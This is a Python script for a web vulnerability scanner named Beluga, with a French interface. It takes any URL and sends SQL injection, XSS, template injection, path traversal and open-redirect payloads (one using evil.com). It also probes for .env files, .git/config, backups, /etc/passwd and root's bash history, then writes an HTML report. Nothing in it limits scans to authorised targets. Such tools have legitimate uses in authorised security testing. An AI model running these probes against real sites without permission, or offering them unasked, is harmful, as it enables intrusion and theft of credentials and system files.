import os
import colorama
import requests
from pystyle import Center, Colorate, Colors

os.makedirs("output", exist_ok=True)

vuln_results = []
os.system("cls")
print(Colorate.Horizontal(Colors.blue_to_cyan, """
 /$$$$$$$  /$$$$$$$$ /$$       /$$   /$$  /$$$$$$   /$$$$$$ 
| $$__  $$| $$_____/| $$      | $$  | $$ /$$__  $$ /$$__  $$ 
| $$  \ $$| $$      | $$      | $$  | $$| $$  \__/| $$  \ $$ 
| $$$$$$$ | $$$$$   | $$      | $$  | $$| $$ /$$$$| $$$$$$$$
| $$__  $$| $$__/   | $$      | $$  | $$| $$|_  $$| $$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \ $$| $$  | $$
| $$$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$
|_______/ |________/|________/ \______/  \______/ |__/  |__/

                ┏━━━━━━━━━━━━━━━━━━━━━┓
                ┃  Author : Ego/xhe   ┃
                ┃ Discord: .gg/xxxx   ┃
                ┗━━━━━━━━━━━━━━━━━━━━━┛
"""))


def log_result(vuln_name, status, details):
    status_str = f"{colorama.Fore.GREEN}✔" if status else f"{colorama.Fore.RED}✘"
    print(f"{status_str} {vuln_name}: {details}")
    vuln_results.append((vuln_name, status, details))


def check_paths(url, paths, vuln_name):
    found = False
    for path in paths:
        try:
            full_url = url.rstrip("/") + "/" + path
            r = requests.get(full_url, timeout=10)
            if r.status_code == 200:
                log_result(vuln_name, True, f"Chemin valide trouvé: /{path}")
                found = True
        except:
            continue
    if not found:
        log_result(vuln_name, False, "Aucun chemin trouvé")


def test_payloads(url, payloads, indicators, vuln_name):
    found = False
    seen = set()
    for payload in payloads:
        try:
            r = requests.get(url + payload, timeout=10)
            for ind in indicators:
                if ind.lower() in r.text.lower() and (payload, ind) not in seen:
                    log_result(vuln_name, True, f"Payload: {payload}")
                    seen.add((payload, ind))
                    found = True
                    break
        except:
            continue
    if not found:
        log_result(vuln_name, False, "Aucun résultat")



def generate_report():
    with open("output/Beluga_Report.html", "w", encoding="utf-8") as f:
        f.write("<html><head><title>Beluga Scan Report</title></head><body>")
        f.write("<h1>Rapport de Scan - Beluga</h1>")
        for vuln, status, details in vuln_results:
            color = "green" if status else "red"
            f.write(f"<p><b style='color:{color}'>[{vuln}]</b> - {details}</p>")
        f.write("</body></html>")


def interesting_paths(url):
    paths = ["admin", "login", "dashboard", "config.php", "backup.zip", ".git/config", ".env"]
    check_paths(url, paths, "Fichiers intéressants")

def sensitive_files(url):
    files = ["etc/passwd", "var/log/auth.log", "root/.bash_history"]
    check_paths(url, files, "Fichiers sensibles")

def sql_injection(url):
    payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL,NULL--"]
    indicators = ["sql syntax", "mysql", "sql error"]
    test_payloads(url, payloads, indicators, "Injection SQL")

def xss(url):
    payloads = ["<script>alert('x')</script>", "<img src=x onerror=alert('x')>"]
    indicators = ["<script>", "onerror", "alert"]
    test_payloads(url, payloads, indicators, "XSS")

def ssti(url):
    payloads = ["{{7*7}}", "{{config}}", "${7*7}"]
    indicators = ["49", "root", "SECRET"]
    test_payloads(url, payloads, indicators, "SSTI")

def open_redirect(url):
    payloads = ["?next=https://evil.com", "?redirect=https://evil.com"]
    indicators = ["evil.com"]
    test_payloads(url, payloads, indicators, "Open Redirect")

def lfi(url):
    payloads = ["?file=../../../../etc/passwd", "?page=../../../../boot.ini"]
    indicators = ["root:x:", "[boot loader]"]
    test_payloads(url, payloads, indicators, "LFI")

def cors_misconfig(url):
    try:
        r = requests.get(url, headers={"Origin": "http://evil.com"}, timeout=10)
        if "Access-Control-Allow-Origin" in r.headers and r.headers["Access-Control-Allow-Origin"] == "*":
            log_result("CORS", True, "Access-Control-Allow-Origin est permissif (*).")
        else:
            log_result("CORS", False, "Pas de vulnérabilité CORS trouvée.")
    except:
        log_result("CORS", False, "Erreur de requête.")

try:
    target = input("Enter URL: ")
    if not target.startswith("http"):
        target = "https://" + target

    print(colorama.Fore.YELLOW + "[+] Démarrage du scan...\n")

    sql_injection(target)
    xss(target)
    lfi(target)
    ssti(target)
    open_redirect(target)
    interesting_paths(target)
    sensitive_files(target)
    cors_misconfig(target)

    print("\n" + colorama.Fore.CYAN + "[i] Génération du rapport HTML...")
    generate_report()
    print(colorama.Fore.GREEN + "[✓] Rapport enregistré dans /output/Beluga_Report.html")

except Exception as e:
    print(colorama.Fore.RED + f"Erreur critique: {e}")

input("\nScan terminé. Appuyez sur Entrée pour quitter...")